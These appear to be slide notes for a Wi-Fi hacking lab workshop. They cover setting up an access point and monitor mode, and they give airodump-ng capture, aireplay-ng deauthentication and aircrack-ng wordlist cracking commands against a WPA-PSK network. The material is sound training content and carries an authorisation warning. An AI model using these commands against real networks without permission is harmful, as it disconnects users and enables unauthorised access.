Wi\-Fi Hacking Workshop

![](img/WifiHackingWorkshop0.png)

Do not hack into any networks without prior authorisation

Wireless AP Setup

Configure the Wireless Access point

![](img/WifiHackingWorkshop1.png)

Add the Wireless adapter to VirtualBox

![](img/WifiHackingWorkshop2.png)

Check for conflicting processes

Start the wireless adapter in monitor mode

![](img/WifiHackingWorkshop3.png)

Discovering BSSID

![](img/WifiHackingWorkshop4.png)

<span style="color:#000000">Sudo airodump\-ng \-c 11 wlan0</span>

Discovering devices

![](img/WifiHackingWorkshop5.png)

sudo airodump\-ng \-c 11 \-\-bssid B0\-95\-75\-5C\-3B\-94 \-w psk wlan0

sudo aireplay\-ng \-0 10 \-a B0:95:75:5C:3B:94 \-c 0C:8D:CA:A6:93:8D wlan0

![](img/WifiHackingWorkshop6.png)

Cracking Password

aircrack\-ng \-w passwordlist\.txt psk\-02\.cap

![](img/WifiHackingWorkshop7.png)

